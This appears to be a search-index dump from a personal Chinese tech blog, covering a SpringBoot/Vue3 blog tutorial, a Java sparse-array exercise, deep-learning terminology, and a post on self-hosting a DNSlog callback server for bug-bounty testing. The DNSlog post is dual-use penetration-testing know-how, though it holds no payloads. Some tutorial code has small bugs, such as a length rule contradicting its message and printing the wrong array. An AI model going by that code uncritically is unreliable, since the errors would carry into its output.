//每个组件可以通过this直接访问到全局挂载的自定义属性：在组件中发起axios请求：this.$http.get('/users') app.config.globalProperties.$http = axios 登录功能编写： 在Login.vue中添加请求 \u003ctemplate\u003e \u003cdiv\u003e \u003cel-container\u003e \u003cel-header\u003e \u003cimg class=\"mlogo\" src=\"https://geoer.cn/images/avatar.png\" alt=\"logo图片\" /\u003e \u003c/el-header\u003e \u003cel-main\u003e \u003cel-form :model=\"ruleForm\" :rules=\"rules\" ref=\"ruleForm\" label-width=\"100px\" class=\"demo-ruleForm\"\u003e \u003cel-form-item label=\"用户姓名\" prop=\"username\"\u003e \u003cel-input v-model=\"ruleForm.username\"\u003e\u003c/el-input\u003e \u003c/el-form-item\u003e \u003cel-form-item label=\"用户密码\" prop=\"password\"\u003e \u003cel-input v-model=\"ruleForm.password\"\u003e\u003c/el-input\u003e \u003c/el-form-item\u003e \u003cel-form-item\u003e \u003cel-button type","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:13:3","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"公共组件Header 要先打开AccountController，在logout方法里面返回一个Result 不然会报错： 1.新建header组件： \u003ctemplate\u003e \u003cdiv class=\"m-content\"\u003e \u003ch3\u003e欢迎来到我的博客\u003c/h3\u003e \u003cdiv class=\"block\"\u003e \u003cdiv class=\"block\"\u003e \u003cel-avatar :size=\"50\" :src=\"user.avatar\"\u003e\u003c/el-avatar\u003e \u003c/div\u003e \u003cdiv\u003e{{user.username}}\u003c/div\u003e \u003cdiv class=\"maction\"\u003e \u003cspan\u003e \u003cel-link\u003e主页\u003c/el-link\u003e \u003c/span\u003e \u003cel-divider direction=\"vertical\"\u003e\u003c/el-divider\u003e \u003cspan\u003e \u003cel-link type=\"success\"\u003e发表博客\u003c/el-link\u003e \u003c/span\u003e \u003cel-divider direction=\"vertical\"\u003e\u003c/el-divider\u003e \u003cspan v-show=\"!hasLogin\"\u003e \u003cel-link type=\"primary\" @click=\"login\"\u003e登录\u003c/el-link\u003e \u003c/span\u003e \u003cspan v-show=\"hasLogin\"\u003e \u003cel-link type=\"danger\" @click=\"logout\"\u003e退出\u003c/el-link\u003e \u003c/span\u003e \u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/template\u003e \u003cscript\u003e export default { name: \"Header\" , data () { return { user: { username: '请先登录', avatar: 'https://geoer.cn/images/avatar.png' }, hasLogin: false } }, methods: { //退出操作 logout () { const _this = this //首先调用后端logout接口(因该接口需要认证权限,所以需要传入token) //其次调用$store清除用户信息及token _this.$http.get(\"/logout\", { headers: { \"Authorization\": localStorage.getItem(\"token\") } }).then(res =\u003e { _this.$store.commit(\"REMOVE_INFO\") _this.$router.push(\"/login\") }) }, login () { //跳转登录页面进行登录 this.$router.push(\"/login\") } }, //页面创建时即会调用,进而获取用户信息 created () { console.log(\"=======123=\") console.log(this.$store.getters.getUser) if (this.$store.getters.getUser.username) {//如果username不为空 this.user.username = this.$store.getters.getUser.username this.user.avatar = this.$store.getters.getUser.avatar //判断是登录状态还是非登录显示 退出按钮或者登录按钮 this.hasLogin = true; } } } \u003c/script\u003e \u003cstyle\u003e .m-content { max-width: 960px; margin: 0 auto; text-align: center; } \u003c/style\u003e 2.引入 \u003ctemplate\u003e \u003cHeader\u003e\u003c/Header\u003e \u003cdiv\u003eBlogs\u003c/div\u003e \u003c/template\u003e \u003cscript\u003e import Header from \"../components/Header.vue\" export default { name: \"Blogs\", //注册组件 components:{ Header } } \u003c/script\u003e \u003cstyle\u003e \u003c/style\u003e 自行测试登录退出功能 ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:13:4","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"博客列表页面开发 使用时间线的样式组件+分页 时间格式： 先给实体类Blog加上JsonFormat @JsonFormat(pattern = \"yyyy-MM-dd HH:mm:ss\") private LocalDateTime created; 完善Blogs.vue内容： \u003ctemplate\u003e \u003cdiv class=\"mcontaner\"\u003e \u003cHeader\u003e\u003c/Header\u003e \u003cdiv class=\"block\"\u003e \u003cel-timeline\u003e \u003cel-timeline-item :timestamp=\"blog.created\" placement=\"top\" v-for=\"(blog,key) in blogs\" :key=key\u003e \u003cel-card\u003e \u003ch4\u003e \u003c!-- 路由 --\u003e \u003crouter-link :to=\"{ name: 'BlogDetail', params: {blogid: blog.id}}\"\u003e{{blog.title}}\u003c/router-link\u003e \u003c/h4\u003e \u003cp\u003e{{blog.description}}\u003c/p\u003e \u003c/el-card\u003e \u003c/el-timeline-item\u003e \u003c/el-timeline\u003e \u003cel-pagination class=\"mage\" background layout=\"prev, pager, next\" :current-page=\"currentPage\" :page-size=\"pageSize\" :total=\"total\" @current-change=page\u003e \u003c/el-pagination\u003e \u003c/div\u003e \u003c/div\u003e \u003c/template\u003e \u003cscript\u003e //引入header组件 import Header from \"../components/Header\"; export default { name: \"Blogs\", components: { Header }, data () { return { blogs: {}, currentPage: 1, total: 0, pageSize: 5 } }, methods: { page (currentPage) { const _this = this _this.$http.get(\"/blogs?currentPage=\" + currentPage).then(res =\u003e { var data = res.data.data _this.blogs = data.records _this.currentPage = data.current _this.pageSize = data.size _this.total = data.total }) } }, created () { this.page(1) } } \u003c/script\u003e \u003cstyle scoped\u003e .block { margin: 20px; } .mage { margin: 0 auto; } \u003c/style\u003e App.vue中统一添加根标签的样式： ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:13:5","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"博客发表/编辑页面开发 安装markdown编辑器：这里使用 mavon-editor npm install mavon-editor --save mavon-editor不支持wue3啊，VUE3的话可以换成v-md-editor npm i @kangc/v-md-editor@next -S 为了方便，我这里选择全局注册使用。那么在main.js里面进行注册 其实不太推荐直接在main.ts中引入，会显得整个文件特别臃肿 以后可以在plugins文件夹下引入第三方插件 我这里先偷个懒吧… import { createApp } from 'vue' import App from './App.vue' // 引入element-plus import ElementPlus from \"element-plus\" import \"element-plus/dist/index.css\" import router from \"./router/index\" import store from './store/index' import axios from 'axios' import \"./axios.js\" import VueMarkdownEditor from '@kangc/v-md-editor'; import '@kangc/v-md-editor/lib/style/base-editor.css'; import vuepressTheme from '@kangc/v-md-editor/lib/theme/vuepress.js'; import '@kangc/v-md-editor/lib/theme/style/vuepress.css'; import Prism from 'prismjs'; VueMarkdownEditor.use(vuepressTheme, { Prism, }); // // 使用element-plus const app = createApp(App) .use(ElementPlus) .use(router) .use(store) .use(VueMarkdownEditor) app.mount('#app') //将axios挂载为app的全局自定义属性之后 //每个组件可以通过this直接访问到全局挂载的自定义属性：在组件中发起axios请求：this.$http.get('/users') app.config.globalProperties.$http = axios 编写BlogEdit.vue \u003ctemplate\u003e \u003cdiv\u003e \u003cHeader\u003e\u003c/Header\u003e \u003cdiv class=\"m-content\"\u003e \u003cel-form :model=\"ruleForm\" :rules=\"rules\" ref=\"ruleForm\" label-width=\"100px\" class=\"demo-ruleForm\"\u003e \u003cel-form-item label=\"标题\" prop=\"title\"\u003e \u003cel-input v-model=\"ruleForm.title\"\u003e\u003c/el-input\u003e \u003c/el-form-item\u003e \u003cel-form-item label=\"摘要\" prop=\"description\"\u003e \u003cel-input type=\"textarea\" v-model=\"ruleForm.description\"\u003e\u003c/el-input\u003e \u003c/el-form-item\u003e \u003cel-form-item label=\"内容\" prop=\"content\"\u003e \u003cv-md-editor v-model=\"ruleForm.content\" height=\"600px\"\u003e\u003c/v-md-editor\u003e \u003c!-- \u003cmavon-editor v-model=\"ruleForm.content\"\u003e\u003c/mavon-editor\u003e --\u003e \u003c/el-form-item\u003e \u003cel-form-item\u003e \u003cel-button type=\"primary\" @click=\"submitForm('ruleForm')\"\u003e立即创建\u003c/el-button\u003e \u003cel-button @click=\"resetForm('ruleForm')\"\u003e重置\u003c/el-button\u003e \u003c/el-form-item\u003e \u003c/el-form\u003e \u003c/div\u003e \u003c/div\u003e \u003c/template\u003e \u003cscript\u003e import Header from \"../components/Header\"; export default { name: \"BlogEdit\", components: { Header }, data () { return { ruleForm: { id: '', title: '', description: '', content: '' }, rules: { title: [ { required: true, message: '请输入标题', trigger: 'blur' }, { min: 3, max: 5, message: '长度在 3 到 15 个字符', trigger: 'blur' } ], description: [ { required: true, message: '请输入摘要', trigger: 'blur' }, ], content: [ { required: true, message: '请输入内容', trigger: 'blur' }, ] } }; }, methods: { submitForm (formName) { this.$refs[formName].validate((valid) =\u003e { if (valid) { const _this = this this.$http.post('/blog/edit', this.ruleForm, { headers: { \"Authorization\": localStorage.getItem(\"token\") } }).then(res =\u003e { _this.$alert('操作成功', '提示', { confirmButtonText: '确定', callback: action =\u003e { _this.$router.push(\"/blogs\") } }); }) } else { console.log('error submit!!'); return false; } }); }, resetForm (formName) { this.$refs[formName].resetFields(); } }, //编辑：如果有这个blogid，就获取，进行编辑 created () { //获取动态路由的 blogid const blogId = this.$route.params.blogid console.log(blogId) const _this = this if (blogId) { this.$http.get(\"/blog/\" + blogId).then(res =\u003e { console.log(res) const blog = res.data.data _this.ruleForm.id = blog.id _this.ruleForm.title = blog.title _this.ruleForm.description = blog.description _this.ruleForm.content = blog.content }) } } } \u003c/script\u003e \u003cstyle scoped\u003e .m-content { text-align: center; } \u003c/style\u003e **Note：**VUE3的话跳转到Detail要把edit放到最后面，顺序和视频里是反过来的。 ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:13:6","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"博客详情页面开发\u0026编辑按钮权限 博客详情中需要回显博客信息，然后有个问题就是，后端传过来的是博客内容是markdown格式的内容，我们需要进行渲染然后显示出来，这里我们使用一个插件markdown-it，用于解析md文档，然后导入github-markdown-c，所谓md的样式。 npm install vue3-markdown-it --save BlogDetail.vue \u003ctemplate\u003e \u003cdiv\u003e \u003cHeader\u003e\u003c/Header\u003e \u003cdiv class=\"blog\"\u003e \u003ch2\u003e{{blog.title}}\u003c/h2\u003e \u003cel-link icon=\"el-icon-edit\" v-if=\"ownBlog\"\u003e \u003c!-- 按钮设置权限，不是自己的id不显示编辑 --\u003e \u003crouter-link :to=\"{name:'BlogEdit',params:{blogid:blog.id}}\"\u003e 编辑 \u003c/router-link\u003e \u003c/el-link\u003e \u003cel-divider\u003e\u003c/el-divider\u003e \u003cdiv class=\"markdown-body\" v-html=\"blog.content\"\u003e\u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/template\u003e \u003cscript\u003e // import MarkdownIT from 'vue3-markdown-it'; import 'highlight.js/styles/a11y-dark.css'; import Header from \"../components/Header\"; export default { name: \"BlogDetail\", components: { Header }, data () { return { blog: { id: '', title: '', content: '', description: '' }, ownBlog: false } }, created () { //获取动态路由的 blogid const blogId = this.$route.params.blogid // const _this = this if (blogId) { this.$http.get(\"/blog/\" + blogId).then(res =\u003e { const blog = res.data.data this.blog.id = blog.id this.blog.title = blog.title this.blog.description = blog.description //MardownIt 渲染 var MardownIt = require(\"markdown-it\") var md = new MardownIt(); var result = md.render(blog.content) this.blog.content = result //查看是否是登录人 是则可以编辑 this.ownBlog = (blog.userId === this.$store.getters.getUser.id) console.log(this.ownBlog) }) } } } \u003c/script\u003e \u003cstyle scoped\u003e .blog { margin-top: 10px; box-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.1); width: 100%; min-height: 700px; padding: 10px; } \u003c/style\u003e ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:13:7","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"路由权限拦截 因为我们是前后端分离的项目。页面已经开发完毕之后，我们来控制一下哪些页面是需要登录之后才能跳转的，如果未登录访问就直接重定向到登录页面，因此我们在src目录下定义一个js文件 1.通过之前我们定义页面路由时候的的meta信息，指定requireAuth: true，需要登录才能访问，因此这里我们在每次路由之前（router.beforeEach）判断token的状态，觉得是否需要跳转到登录页面。 // import Demo from '@/views/Demo' import Login from '@/views/Login' import Blogs from '@/views/Blogs' import BlogEdit from '@/views/BlogEdit' import BlogDetail from '@/views/BlogDetail' //创建具体的路由 const routes = [ { path: '/', name: 'Index', redirect:{name : \"Blogs\"} }, { path: '/blogs', name: 'Blogs', component: Blogs },{ path: '/Login', name: 'Login', component: Login },{ path: '/blog/add', // 注意放在 path: '/blog/:blogId'之前 name: 'BlogAdd', component: BlogEdit, meta: { requireAuth: true } }, { path: '/blog/:blogid', name: 'BlogDetail', component: BlogDetail } ,{ // path: '/blog/:blogid/edit', vue2,而vue3中应该edit在前面，id在后面 path: '/blog/edit/:blogid', name: 'BlogEdit', component: BlogEdit, meta: { requireAuth: true } } ] export default routes 2.配置一个路由前置拦截 src下面新建一个permission.js: import router from \"./router\"; // 路由判断登录 根据路由配置文件的参数 router.beforeEach((to, from, next) =\u003e { if (to.matched.some(record =\u003e record.meta.requireAuth)) { // 判断该路由是否需要登录权限 const token = localStorage.getItem(\"token\") console.log(\"------------\" + token) if (token) { // 判断当前的token是否存在 ； 登录存入的token if (to.path === '/login') { } else { next() } } else { //如果不存在就跳到登录页面 next({ path: '/login' }) } } else { next() } }) 然后我们在main.js中import我们的permission.js 测试： 退出状态下，我们再去访问/blog/add的时候就会自动重定向到/login ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:13:8","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"增加删除文章功能 **前端：src/views/BlogDetail.vue ** \u003ctemplate\u003e \u003cdiv\u003e \u003cHeader\u003e\u003c/Header\u003e \u003cdiv class=\"blog\"\u003e \u003ch2\u003e{{blog.title}}\u003c/h2\u003e \u003cel-link icon=\"el-icon-edit\" v-if=\"ownBlog\"\u003e \u003c!-- 按钮设置权限，不是自己的id不显示编辑 --\u003e \u003crouter-link :to=\"{name:'BlogEdit',params:{blogid:blog.id}}\"\u003e 编辑 \u003c/router-link\u003e \u003c/el-link\u003e \u003cel-link icon=\"el-icon-delete\" v-if=\"ownBlog\" class=\"linklist\"\u003e \u003cel-button type=\"danger\" round @click=\"delblog\"\u003e删除\u003c/el-button\u003e \u003c/el-link\u003e \u003cel-divider\u003e\u003c/el-divider\u003e \u003cdiv class=\"markdown-body\" v-html=\"blog.content\"\u003e\u003c/div\u003e \u003c/div\u003e \u003c/div\u003e \u003c/template\u003e \u003cscript\u003e // import MarkdownIT from 'vue3-markdown-it'; import 'highlight.js/styles/a11y-dark.css'; import Header from \"../components/Header\"; export default { name: \"BlogDetail\", components: { Header }, data () { return { blog: { id: '', title: '', content: '', description: '' }, ownBlog: false } }, methods: { delblog () { const blogId = this.$route.params.blogid const _this = this if (blogId) { this.$confirm('此操作将永久删除该文章, 是否继续?', '提示', { confirmButtonText: '确定', cancelButtonText: '取消', type: 'warning' }).then(() =\u003e { _this.$http.post(`/blogdel/${blogId}`, null, { headers: { \"Authorization\": localStorage.getItem(\"token\") } }).then(res =\u003e { this.$message({ type: 'success', message: res.data.data }); _this.$router.push(\"/blogs\") }) }).catch(() =\u003e { this.$message({ type: 'info', message: '已取消删除' }); }); } } }, created () { //获取动态路由的 blogid const blogId = this.$route.params.blogid // const _this = this if (blogId) { this.$http.get(\"/blog/\" + blogId).then(res =\u003e { const blog = res.data.data this.blog.id = blog.id this.blog.title = blog.title this.blog.description = blog.description //MardownIt 渲染 var MardownIt = require(\"markdown-it\") var md = new MardownIt(); var result = md.render(blog.content) this.blog.content = result //查看是否是登录人 是则可以编辑 this.ownBlog = (blog.userId === this.$store.getters.getUser.id) console.log(this.ownBlog) }) } } } \u003c/script\u003e \u003cstyle scoped\u003e .blog { margin-top: 10px; box-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.1); width: 100%; min-height: 700px; padding: 10px; } \u003c/style\u003e 后端： src/main/java/com/vuelog/controller/BlogController //删除文章 //@PathVariable动态路由 @RequiresAuthentication //需要认证之后才能操作 @PostMapping(\"/blogdel/{id}\") public Result edit(@PathVariable Long id){ //判断是否是自己的文章(文章id属于自己) Assert.isTrue(blogService.getById(id).getUserId().longValue() == ShiroUtil.getProfile().getId().longValue(),\"没有删除权限\"); boolean b = blogService.removeById(id); //判断是否为空 为空则断言异常 if(b==true){ return Result.succ(\"文章删除成功\"); }else{ return Result.fail(\"文章删除失败\"); } } 最后放一下pom.xml的内容： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cparent\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-starter-parent\u003c/artifactId\u003e \u003cversion\u003e2.5.7\u003c/version\u003e \u003c!-- \u003cversion\u003e3.1.1\u003c/version\u003e--\u003e \u003crelativePath/\u003e \u003c!-- lookup parent from repository --\u003e \u003c/parent\u003e \u003cgroupId\u003ecom.example\u003c/groupId\u003e \u003cartifactId\u003evueblog1\u003c/artifactId\u003e \u003cversion\u003e0.0.1-SNAPSHOT\u003c/version\u003e \u003cname\u003evueblog\u003c/name\u003e \u003cdescription\u003evueblog\u003c/description\u003e \u003cproperties\u003e \u003cjava.version\u003e17\u003c/java.version\u003e \u003c/properties\u003e \u003cdependencies\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-starter-web\u003c/artifactId\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-devtools\u003c/artifactId\u003e \u003cscope\u003eruntime\u003c/scope\u003e \u003coptional\u003etrue\u003c/optional\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003emysql\u003c/groupId\u003e \u003cartifactId\u003emysql-connector-java\u003c/artifactId\u003e \u003cscope\u003eruntime\u003c/scope\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.projectlombok\u003c/groupId\u003e \u003cartifactId\u003elombok\u003c/artifactId\u003e \u003coptional\u003etrue\u003c/optional\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-starter-test\u003c/artifactId\u003e \u003cscope\u003etest\u003c/scope\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cart","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:13:9","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["渗透测试"],"content":"昨天挖SRC的时候使用公开的dnslog平台，被坑了一把，对方可能检测到了流量的报警，迅速把站关了…..损失一个RCE呜呜 所以自己搭建一个dnslog平台看看 ","date":"2023-03-23","objectID":"/%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BAdnslog%E5%B9%B3%E5%8F%B0/:0:0","tags":["dnslog","渗透测试"],"title":"自己搭建dnslog平台","uri":"/%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BAdnslog%E5%B9%B3%E5%8F%B0/"},{"categories":["渗透测试"],"content":"准备工作 一台公网VPS 一个域名 我这里都是用的阿里云的 使用的平台：https://github.com/lanyi1998/DNSlog-GO ","date":"2023-03-23","objectID":"/%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BAdnslog%E5%B9%B3%E5%8F%B0/:1:0","tags":["dnslog","渗透测试"],"title":"自己搭建dnslog平台","uri":"/%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BAdnslog%E5%B9%B3%E5%8F%B0/"},{"categories":["渗透测试"],"content":"配置 1.到阿里云云解析DNS中，进行相应的配置： 然后，在云服务器ECS安全组规则里开放UDP的53端口 2.下载并解压：https://github.com/lanyi1998/DNSlog-GO 3.配置文件： vim config.yaml 4.（根据情况选择） 我这里阿里云机器遇到53端口占用的问题，解决办法： 5.启动 ./main 6.访问dnslog平台即可使用 但是我这里有个小疑问，本地解析出来的127.0.0.1 可能是没设置dns host??? 其他参考文章： https://www.f12bug.com/archives/dnslog%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA https://mp.weixin.qq.com/s/m_UXJa0imfOi721bkBpwFg ","date":"2023-03-23","objectID":"/%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BAdnslog%E5%B9%B3%E5%8F%B0/:2:0","tags":["dnslog","渗透测试"],"title":"自己搭建dnslog平台","uri":"/%E8%87%AA%E5%B7%B1%E6%90%AD%E5%BB%BAdnslog%E5%B9%B3%E5%8F%B0/"},{"categories":["Java"],"content":"介绍 当一个数组中大部分元素为0，或者为同一值的数组时，可以使用稀疏数组来保存该数组。 稀疏数组的处理方式是： 记录数组一共有几行几列，有多少个不同值 把具有不同值的元素和行列及值记录在一个小规模的数组中，从而缩小程序的规模 如下图： ","date":"2023-03-16","objectID":"/%E7%A8%80%E7%96%8F%E6%95%B0%E7%BB%84/:1:0","tags":["Java学习","稀疏矩阵"],"title":"稀疏数组","uri":"/%E7%A8%80%E7%96%8F%E6%95%B0%E7%BB%84/"},{"categories":["Java"],"content":"例子 那么这个就是： 11,11,2 1,2,1 2,3,2 第二行第三列值是2 package basic; /** * @author 剑胆琴心 * @create 2023-03-16 16:24 */ public class Practice1 { public static void main(String[] args) { System.out.println(\"输出原始数组:\"); //1.创建一个二维数组11*11，,0表示没有棋子，1：黑棋，2白棋 int[][] arraryy = new int[11][11]; arraryy[1][2]=1; arraryy[2][3]=2; //输出原始数组 for(int[] ins:arraryy){ for(int intA: ins){ System.out.print(intA +\"\\t\"); } System.out.println(); } System.out.println(\"------\"); //转换为稀疏数组保存 //获取有效值的个数 int summ = 0; for(int i=0; i\u003c 11; i++){ for(int j=0; j\u003c11; j++){ if (arraryy[i][j] !=0){ summ++; } } } System.out.println(\"有效值个数：\" + summ); //2.创建一个稀疏数组的数组 int[][] arr_xishu = new int[summ+1][3]; arr_xishu[0][0] = 11; arr_xishu[0][1] = 11; arr_xishu[0][2] = summ; //稀疏数组的头打印完毕 //遍历二维数组，将非0值存放到稀疏数组中 int count=0; for(int i=0; i\u003c arraryy.length; i++){ for(int j=0; j\u003carraryy[i].length; j++){ if (arraryy[i][j] !=0){ count++; //3. // if有效数字的话会先count++变成1，所以是从第二行开始存放，不影响有几个有效数字代表count是几 // 可以理解成第一个有效数字的i、j坐标和数值放在了第一个count（这时候是等于1）那行 arr_xishu[count][0] = i; //第几行，第0列存放横坐标 arr_xishu[count][1] = j; //第几行，第1列存放横坐标 arr_xishu[count][2] = arraryy[i][j]; //第几行，第2列存放值 } } } System.out.println(\"------输出稀疏数组：\"); //输出稀疏数组 for(int i=0; i\u003carr_xishu.length; i++){ System.out.println(arr_xishu[i][0] +\"\\t\" + arr_xishu[i][1] +\"\\t\" + arr_xishu[i][2] +\"\\t\" ); } //还原稀疏数组 //1.读取稀疏数组 int[][] arr3 = new int[arr_xishu[0][0]][arr_xishu[0][1]]; //2.还原值 for(int i=1; i\u003c arr_xishu.length;i++){ arr3[arr_xishu[i][0]][arr_xishu[i][1]] = arr_xishu[i][2]; } System.out.println(\"------稀疏矩阵还原：\"); //打印 for(int[] ins:arraryy){ for(int intA: ins){ System.out.print(intA +\"\\t\"); } System.out.println(); } } } ","date":"2023-03-16","objectID":"/%E7%A8%80%E7%96%8F%E6%95%B0%E7%BB%84/:2:0","tags":["Java学习","稀疏矩阵"],"title":"稀疏数组","uri":"/%E7%A8%80%E7%96%8F%E6%95%B0%E7%BB%84/"},{"categories":["AI"],"content":" 学习了这么久了还是一个小白，容易弄混一些名词 基于深度学习的现在目标检测算法中有三个组件：Backbone、Neck和Head: ","date":"2023-03-09","objectID":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/:0:0","tags":["深度学习","常识"],"title":"深度学习中常见名词","uri":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/"},{"categories":["AI"],"content":"1.backbone 翻译为主干网络的意思，既然说是主干网络，就代表其是网络的一部分，那么是哪部分呢？主要指用于特征提取的，已在大型数据集(例如ImageNet|COCO等)上完成预训练，拥有预训练参数的卷积神经网络，例如：ResNet-50、Darknet53等。 这个主干网络大多时候指的是提取特征的网络，其作用就是提取图片中的信息，供后面的网络使用。这些网络经常使用的是resnet VGG等，而不是我们自己设计的网络，因为这些网络已经证明了在分类等问题上的特征提取能力是很强的。在用这些网络作为backbone的时候，都是直接加载官方已经训练好的模型参数，后面接着我们自己的网络。让网络的这两个部分同时进行训练，因为加载的backbone模型已经具有提取特征的能力了，在我们的训练过程中，会对他进行微调，使得其更适合于我们自己的任务。 ","date":"2023-03-09","objectID":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/:0:1","tags":["深度学习","常识"],"title":"深度学习中常见名词","uri":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/"},{"categories":["AI"],"content":"2.head head是获取网络输出内容的网络，利用之前提取的特征，head利用这些特征，做出预测。主要用于预测目标的种类和位置(bounding boxes) ","date":"2023-03-09","objectID":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/:0:2","tags":["深度学习","常识"],"title":"深度学习中常见名词","uri":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/"},{"categories":["AI"],"content":"3.neck 是放在backbone和head之间的，是为了更好的利用backbone提取的特征，会添加一些用于收集不同阶段中特征图的网络层 简而言之，基于深度学习的目标检测模型的结构是这样的：输入-\u003e主干-\u003e脖子-\u003e头-\u003e输出。主干网络提取特征，脖子提取一些更复杂的特征，然后头部计算预测输出 